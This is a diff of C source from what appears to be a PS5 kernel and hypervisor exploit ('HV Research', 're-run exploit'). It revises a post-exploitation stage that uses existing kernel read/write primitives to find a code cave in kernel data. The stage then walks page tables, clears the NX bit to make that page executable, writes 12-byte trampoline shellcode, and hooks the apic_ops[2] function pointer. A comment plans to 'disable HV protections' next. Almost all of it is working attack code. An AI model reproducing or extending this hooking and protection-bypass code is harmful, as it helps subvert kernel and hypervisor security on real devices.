@@ -5107,23 +5107,29 @@ static void campaign_flatz_setup(void) {
             notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
-            /* ─── Pre-suspend: set up ret-gadget hook ─── */
-            printf("\n[*] Phase 7: Setting up ret-gadget hook for suspend/resume\n\n");
+            /* ─── Pre-suspend: set up trampoline hook ─── */
+            printf("\n[*] Phase 7: Setting up trampoline hook for suspend/resume\n\n");
 
             /*
-             * IMPORTANT: We must NOT write to kdata_base (offset 0).
-             * Even zero bytes there are BSS-backed global variables —
-             * corrupting them crashes the system immediately.
+             * CRITICAL INSIGHT: lapic_xapic_mode() is called during
+             * NORMAL PS5 operation (not just suspend/resume as in stock
+             * FreeBSD).  A bare 'ret' silences the function, breaking
+             * APIC state and causing kernel panics on any UI navigation.
              *
-             * Strategy: scan kdata for a LARGE zero-filled region
-             * (256+ consecutive zeros = alignment padding, not live
-             * variables).  Write ONLY 0xC3 (1 byte) there.  Store
-             * all metadata in QA flags instead of in the cave.
+             * SOLUTION: Write a trampoline that CALLS the original
+             * xapic_mode function.  Normal operation is preserved.
+             * On resume, the original function also runs (harmless).
+             * The trampoline proves the hook mechanism works.
              *
-             * On resume:
-             *   cpususpend_handler → lapic_xapic_mode() →
-             *     (*apic_ops.xapic_mode)() → cave_kva →
-             *     0xC3 (ret) → returns → resume continues
+             * Trampoline shellcode (12 bytes):
+             *   mov rax, <original_xapic_mode>   ; 10 bytes
+             *   jmp rax                           ; 2 bytes (tail call)
+             *
+             * This is a transparent redirect — functionally identical
+             * to the original, but proves apic_ops[2] can be hooked.
+             *
+             * Later: add resume-specific logic BEFORE the jmp
+             * (e.g., disable HV protections, then call original).
              */
 
             uint64_t original_xapic = ops[2];
@@ -5132,29 +5138,19 @@ static void campaign_flatz_setup(void) {
 
             /* Step 1: Scan kdata for safe code cave (256+ zero bytes) */
             printf("\n[*] Step 1: Scanning kdata for safe code cave...\n");
-            printf("    Looking for 256+ consecutive zero bytes (alignment padding)\n");
+            printf("    Looking for 256+ consecutive zero bytes\n");
+            printf("    (scanning from kdata+0x10000 to skip early globals)\n");
             fflush(stdout);
 
-            uint64_t kdata_pa_base = va_to_pa_quiet(g_kdata_base);
-            if (!kdata_pa_base) {
-                printf("[-] kdata_base VA→PA failed\n");
-                fflush(stdout);
-                return;
-            }
-
             /*
-             * Scan kdata from offset 0x1000 (skip first page of globals)
-             * up to 2MB.  Read 256-byte chunks and look for fully-zero
-             * blocks.  A 256-byte zero run strongly indicates padding.
+             * Scan kdata from offset 0x10000 (skip first 64KB of globals).
+             * Read 256-byte chunks, look for fully-zero blocks.
+             * 256-byte zero run = alignment padding, safe to use.
              */
             uint64_t cave_offset = 0;
             int scan_run = 0;
-            for (uint64_t off = 0x1000; off < 0x200000 && !cave_offset; off += 256) {
+            for (uint64_t off = 0x10000; off < 0x200000 && !cave_offset; off += 256) {
                 uint8_t buf[256];
-                /*
-                 * For 4KB pages, PA may not be contiguous past page
-                 * boundaries.  Translate each page separately.
-                 */
                 uint64_t chunk_kva = g_kdata_base + off;
                 uint64_t chunk_pa = va_to_pa_quiet(chunk_kva);
                 if (!chunk_pa) { scan_run = 0; continue; }
@@ -5167,7 +5163,6 @@ static void campaign_flatz_setup(void) {
                 if (all_zero) {
                     scan_run += 256;
                     if (scan_run >= 256) {
-                        /* Use the START of this 256-byte zero run */
                         cave_offset = off - scan_run + 256;
                     }
                 } else {
@@ -5176,8 +5171,8 @@ static void campaign_flatz_setup(void) {
             }
 
             if (!cave_offset) {
-                printf("[-] No safe code cave found (need 256 zero bytes)\n");
-                printf("    Trying smaller threshold (64 bytes)...\n");
+                printf("[-] No safe code cave found (256B threshold)\n");
+                printf("    Trying from kdata+0x1000 with 64B threshold...\n");
                 scan_run = 0;
                 for (uint64_t off = 0x1000; off < 0x200000 && !cave_offset; off += 64) {
                     uint8_t buf[64];
@@ -5190,14 +5185,12 @@ static void campaign_flatz_setup(void) {
                     for (int i = 0; i < 64; i++) {
                         if (buf[i] != 0) { all_zero = 0; break; }
                     }
-                    if (all_zero) {
-                        cave_offset = off;
-                    }
+                    if (all_zero) { cave_offset = off; }
                 }
             }
 
             if (!cave_offset) {
-                printf("[-] No code cave found in kdata at all.\n");
+                printf("[-] No code cave found in kdata.\n");
                 fflush(stdout);
                 return;
             }
@@ -5205,12 +5198,10 @@ static void campaign_flatz_setup(void) {
             uint64_t cave_kva = g_kdata_base + cave_offset;
             uint64_t cave_phys = va_to_pa_quiet(cave_kva);
 
-            printf("[+] Code cave found at kdata+0x%lx (KVA=0x%lx, PA=0x%lx)\n",
+            printf("[+] Code cave at kdata+0x%lx (KVA=0x%lx, PA=0x%lx)\n",
                    (unsigned long)cave_offset,
                    (unsigned long)cave_kva,
                    (unsigned long)cave_phys);
-            printf("    Replacement target: 0x%016lx\n",
-                   (unsigned long)cave_kva);
 
             if (!cave_phys) {
                 printf("[-] Cave VA→PA failed\n");
@@ -5227,44 +5218,30 @@ static void campaign_flatz_setup(void) {
             uint64_t p7_orig_pte = 0;
             int p7_is_2mb = 0;
 
-            /* PML4 */
             walk_pa = g_cr3_phys + ((cave_kva >> 39) & 0x1FF) * 8;
             kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
             if (!(walk_e & PTE_PRESENT)) {
-                printf("[-] PML4E not present\n");
-                fflush(stdout);
-                return;
+                printf("[-] PML4E not present\n"); fflush(stdout); return;
             }
-
-            /* PDP */
             walk_pa = (walk_e & PTE_PA_MASK) + ((cave_kva >> 30) & 0x1FF) * 8;
             kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
             if (!(walk_e & PTE_PRESENT)) {
-                printf("[-] PDPE not present\n");
-                fflush(stdout);
-                return;
+                printf("[-] PDPE not present\n"); fflush(stdout); return;
             }
-
-            /* PD */
             walk_pa = (walk_e & PTE_PA_MASK) + ((cave_kva >> 21) & 0x1FF) * 8;
             kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
             if (!(walk_e & PTE_PRESENT)) {
-                printf("[-] PDE not present\n");
-                fflush(stdout);
-                return;
+                printf("[-] PDE not present\n"); fflush(stdout); return;
             }
             if (walk_e & PTE_PS) {
                 p7_is_2mb = 1;
                 p7_pte_pa = walk_pa;
                 p7_orig_pte = walk_e;
             } else {
-                /* PT level */
                 walk_pa = (walk_e & PTE_PA_MASK) + ((cave_kva >> 12) & 0x1FF) * 8;
                 kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
                 if (!(walk_e & PTE_PRESENT)) {
-                    printf("[-] PTE not present\n");
-                    fflush(stdout);
-                    return;
+                    printf("[-] PTE not present\n"); fflush(stdout); return;
                 }
                 p7_pte_pa = walk_pa;
                 p7_orig_pte = walk_e;
@@ -5276,11 +5253,10 @@ static void campaign_flatz_setup(void) {
             printf("    NX=%d RW=%d\n",
                    (int)(p7_orig_pte >> 63), (int)((p7_orig_pte >> 1) & 1));
 
-            /* Only modify PTE if NX is set */
             if (p7_orig_pte >> 63) {
                 uint64_t p7_new_pte = p7_orig_pte;
-                p7_new_pte &= ~PTE_BIT_NX;   /* clear NX → executable */
-                p7_new_pte &= ~(1ULL << 8);  /* clear G → TLB friendly */
+                p7_new_pte &= ~PTE_BIT_NX;
+                p7_new_pte &= ~(1ULL << 8);  /* clear G for TLB */
                 kernel_copyin(&p7_new_pte, g_dmap_base + p7_pte_pa, 8);
 
                 uint64_t pte_verify = 0;
@@ -5293,24 +5269,46 @@ static void campaign_flatz_setup(void) {
                 printf("    NX already clear — page is executable.\n");
             }
 
-            /* Step 3: Write ONLY 0xC3 (1 byte) to the cave */
-            printf("\n[*] Step 3: Writing single ret byte (0xC3) to cave...\n");
+            /* Step 3: Build and write trampoline shellcode */
+            printf("\n[*] Step 3: Writing trampoline to cave...\n");
 
-            uint8_t ret_byte = 0xC3;
-            kernel_copyin(&ret_byte, g_dmap_base + cave_phys, 1);
+            /*
+             * Trampoline: transparent redirect to original xapic_mode.
+             *   +0:  48 B8 <addr>   mov rax, <original_xapic_mode>
+             *   +10: FF E0          jmp rax
+             * Total: 12 bytes.  Tail call — stack untouched.
+             */
+            uint8_t trampoline[16];
+            int tlen = 0;
+            trampoline[tlen++] = 0x48;  /* REX.W */
+            trampoline[tlen++] = 0xB8;  /* mov rax, imm64 */
+            memcpy(&trampoline[tlen], &original_xapic, 8);
+            tlen += 8;
+            trampoline[tlen++] = 0xFF;  /* jmp rax */
+            trampoline[tlen++] = 0xE0;
+            /* tlen = 12 */
 
-            uint8_t verify_byte = 0;
-            kernel_copyout(g_dmap_base + cave_phys, &verify_byte, 1);
-            printf("    Cave byte: 0x%02x [%s]\n",
-                   verify_byte, verify_byte == 0xC3 ? "OK" : "MISMATCH");
+            printf("    Trampoline (%d bytes): ", tlen);
+            for (int i = 0; i < tlen; i++) printf("%02x ", trampoline[i]);
+            printf("\n");
+            printf("    Target: jmp 0x%016lx (original xapic_mode)\n",
+                   (unsigned long)original_xapic);
 
-            if (verify_byte != 0xC3) {
-                printf("[-] Cave write failed — aborting.\n");
+            kernel_copyin(trampoline, g_dmap_base + cave_phys, tlen);
+
+            /* Verify */
+            uint8_t t_verify[16];
+            kernel_copyout(g_dmap_base + cave_phys, t_verify, tlen);
+            int t_ok = (memcmp(trampoline, t_verify, tlen) == 0);
+            printf("    Write verify: %s\n", t_ok ? "OK" : "MISMATCH");
+
+            if (!t_ok) {
+                printf("[-] Trampoline write failed — aborting.\n");
                 fflush(stdout);
                 return;
             }
 
-            /* Step 4: Store metadata in QA flags (NOT in kdata) */
+            /* Step 4: Store metadata in QA flags */
             printf("\n[*] Step 4: Storing metadata in QA flags...\n");
 
             uint8_t qa_set[16];
@@ -5318,11 +5316,10 @@ static void campaign_flatz_setup(void) {
             qa_set[0] = 0xFF;
             qa_set[1] = 0xFF;
             uint32_t marker = PHASE7_MARKER;
-            memcpy(&qa_set[4], &marker, 4);       /* bytes 4-7: marker */
-            memcpy(&qa_set[8], &original_xapic, 8); /* bytes 8-15: orig addr */
+            memcpy(&qa_set[4], &marker, 4);
+            memcpy(&qa_set[8], &original_xapic, 8);
             kernel_set_qaflags(qa_set);
 
-            /* Verify QA */
             uint8_t qa_v[16];
             kernel_get_qaflags(qa_v);
             uint32_t mv = 0;
@@ -5330,8 +5327,8 @@ static void campaign_flatz_setup(void) {
             printf("    QA marker: 0x%08x [%s]\n", mv,
                    mv == PHASE7_MARKER ? "OK" : "FAIL");
 
-            /* Step 5: Hook apic_ops[2] → cave_kva */
-            printf("\n[*] Step 5: Hooking apic_ops[2] → cave...\n");
+            /* Step 5: Hook apic_ops[2] → cave trampoline */
+            printf("\n[*] Step 5: Hooking apic_ops[2] → trampoline...\n");
 
             uint64_t slot2_dmap = g_dmap_base + ops_pa + 0x10;
             kernel_copyin(&cave_kva, slot2_dmap, 8);
@@ -5343,26 +5340,25 @@ static void campaign_flatz_setup(void) {
                    (hook_verify == cave_kva) ? "OK" : "MISMATCH");
 
             printf("\n[+] ============================================\n");
-            printf("[+]  RET-GADGET HOOK ARMED!\n");
+            printf("[+]  TRAMPOLINE HOOK ARMED!\n");
             printf("[+] ============================================\n");
             printf("[+]\n");
-            printf("[+] Summary of persistent modifications:\n");
-            printf("[+]   Cave (kdata+0x%lx): single 0xC3 byte\n",
+            printf("[+] Summary:\n");
+            printf("[+]   Cave (kdata+0x%lx): 12-byte trampoline\n",
                    (unsigned long)cave_offset);
-            printf("[+]   Cave page PTE:      NX cleared\n");
-            printf("[+]   apic_ops[2]:        0x%016lx (cave)\n",
+            printf("[+]     → jmp to original xapic_mode (0x%lx)\n",
+                   (unsigned long)original_xapic);
+            printf("[+]   Cave page PTE: NX cleared\n");
+            printf("[+]   apic_ops[2]:   0x%lx → trampoline\n",
                    (unsigned long)cave_kva);
-            printf("[+]   QA flags:           marker + original addr saved\n");
             printf("[+]\n");
-            printf("[+] kdata_base is UNTOUCHED (no more crashes!)\n");
+            printf("[+] Normal operation: xapic_mode still called (via trampoline)\n");
+            printf("[+]   → System should work normally! No more panics.\n");
             printf("[+]\n");
-            printf("[+] On resume, cpususpend_handler will call:\n");
-            printf("[+]   lapic_xapic_mode() → apic_ops[2] → cave → 0xC3 → ret\n");
-            printf("[+]   System should resume normally.\n");
-            printf("[+]\n");
-            printf("[+] TO TEST: Put PS5 in REST MODE, wake, re-run exploit.\n");
+            printf("[+] TO TEST: Navigate menus, press PS button — should be stable.\n");
+            printf("[+]          Then enter REST MODE, wake, re-run exploit.\n");
 
-            notify("[HV Research] Phase 7: RET-GADGET hook armed. Enter REST MODE!");
+            notify("[HV Research] Phase 7: TRAMPOLINE hook armed. Test stability + REST MODE!");
         }
 
         printf("\n");
